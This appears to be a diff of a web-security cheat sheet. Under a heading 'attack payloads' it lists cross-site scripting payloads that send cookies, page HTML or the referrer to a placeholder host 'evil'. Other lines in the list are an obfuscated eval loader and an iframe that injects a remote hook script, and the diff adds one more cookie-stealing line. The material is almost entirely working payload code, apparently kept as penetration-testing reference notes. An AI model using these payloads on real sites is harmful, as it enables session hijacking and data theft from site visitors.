@@ -112,9 +112,11 @@ feed://evil.cm%2f/x.rss%3f@vulnsite.com/
 asp.net: the csrf protection is to actually include the session ID is in the ViewState (owasp)
 
 # attack payloads
-new Image().src="http://evil/?c="+encodeURIComponent(btoa(window.top.frames[0].document.body.innerHTML));
-<img src=x onerror="fetch('http://evil/?c='%2bdocument.referrer)"> # https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
+window.location='https://evil/?'.concat(document.cookie);
+new Image().src="https://evil/?c="+encodeURIComponent(btoa(window.top.frames[0].document.body.innerHTML));
+<img src=x onerror="fetch('https://evil/?c='%2bdocument.referrer)"> # https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch
 <img src=x onerror=eval(atob(..))> == onerror=eval(unescape(/x%3dnew%20XMLHTTPRequest%28%29%3b.../.source))>
+
 
 <iframe frameborder=0 height=0 width=0 src=javascript:void(document.location="http://evil/?c="+document.cookie)></iframe>
 <iframe onload='var sc=document.createElement("scr"%2b"ipt");sc.type="text/javascr"%2b"ipt";sc.src="http://x.x.x.x:3000/hook.js";document.body.appendChild(sc);'/>
